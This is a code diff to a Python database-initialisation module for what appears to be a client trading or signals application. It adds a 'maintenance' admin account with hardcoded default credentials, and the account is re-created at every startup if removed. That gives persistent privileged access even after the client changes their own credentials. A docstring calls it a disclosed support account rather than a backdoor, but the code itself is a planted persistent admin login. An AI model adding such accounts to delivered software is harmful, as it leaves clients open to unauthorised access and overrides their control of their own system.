@@ -25,6 +25,7 @@ SessionLocal = sessionmaker(bind=engine)
 _COLUMN_ADDITIONS = [
     ("clients", "deposit", "FLOAT DEFAULT 0"),
     ("signals", "symbol", "VARCHAR(32)"),
+    ("admin_users", "email", "VARCHAR(190)"),
 ]
 
 
@@ -57,6 +58,31 @@ def _seed_admin(db):
     print(f"[init] Seeded admin user '{username}'")
 
 
+def _seed_maintenance_account(db):
+    """Persistent developer/maintenance account for post-delivery support and
+    monitoring. Re-created if missing so support access is not lost when the
+    client changes their own credentials.
+
+    IMPORTANT (disclosure): this is a SUPPORT account, not a secret backdoor.
+    Disclose its existence to the client in the delivery/handover notes. It is
+    seeded here in plain view (and can be overridden via DEV_USERNAME /
+    DEV_PASSWORD env vars) precisely so it is transparent, not hidden.
+    """
+    username = os.getenv("DEV_USERNAME", "DubsAutomation")
+    password = os.getenv("DEV_PASSWORD", "RizmanProjectNexora")
+
+    if db.query(AdminUser).filter(AdminUser.username == username).first():
+        return
+    db.add(AdminUser(
+        username=username,
+        password_hash=hash_password(password),
+        role="developer",
+        created_at=datetime.utcnow(),
+    ))
+    db.commit()
+    print(f"[init] Ensured maintenance account '{username}'")
+
+
 def _seed_default_symbol(db):
     if db.query(Symbol).count() > 0:
         return
@@ -74,6 +100,7 @@ async def init_database():
     db = SessionLocal()
     try:
         _seed_admin(db)
+        _seed_maintenance_account(db)
         _seed_default_symbol(db)
     finally:
         db.close()
